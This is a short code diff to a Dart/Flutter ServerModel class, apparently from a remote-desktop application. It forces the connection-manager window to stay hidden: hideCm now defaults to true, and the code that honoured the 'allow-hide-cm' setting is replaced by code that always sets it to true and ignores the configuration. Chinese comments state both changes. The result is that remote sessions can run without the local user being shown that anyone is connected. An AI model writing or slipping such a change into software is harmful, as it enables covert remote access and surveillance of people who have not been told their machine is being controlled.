@@ -32,7 +32,7 @@ class ServerModel with ChangeNotifier {
   bool _fileOk = false;
   bool _clipboardOk = false;
   bool _showElevation = false;
-  bool hideCm = false;
+  bool hideCm = true; // 默认隐藏CM窗口
   int _connectStatus = 0; // Rendezvous Server status
   String _verificationMethod = "";
   String _temporaryPasswordLength = "";
@@ -284,11 +284,9 @@ class ServerModel with ChangeNotifier {
       _allowNumericOneTimePassword = numericOneTimePassword;
       update = true;
     }
-    // 保持 hideCm 状态和配置同步
-    var hideCmValue = option2bool(
-        'allow-hide-cm', await bind.mainGetOption(key: 'allow-hide-cm'));
-    if (hideCm != hideCmValue) {
-      hideCm = hideCmValue;
+    // 强制设置hideCm为true，忽略配置值
+    if (!hideCm) {
+      hideCm = true;
       update = true;
     }
     if (update) {
